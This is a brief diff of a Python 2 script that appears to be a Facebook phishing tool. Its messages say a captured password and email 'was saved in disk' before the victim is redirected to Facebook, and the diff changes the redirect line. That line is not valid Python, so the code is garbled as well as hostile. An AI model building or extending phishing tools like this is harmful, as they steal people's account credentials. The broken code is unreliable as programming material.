@@ -48,4 +48,4 @@ print '0\33[1;92m'+'the password and email was saved in disk :D'+'\033[0;0m'
 print '0\33[1;92m'+'you are begin redirected to facebook'+'\033[0;0m'
 time.sleep(42)
 def redirect(request):
-    return https://www.facebook.com/('//')
+    return https://www.facebook.com/('/Chrome/')
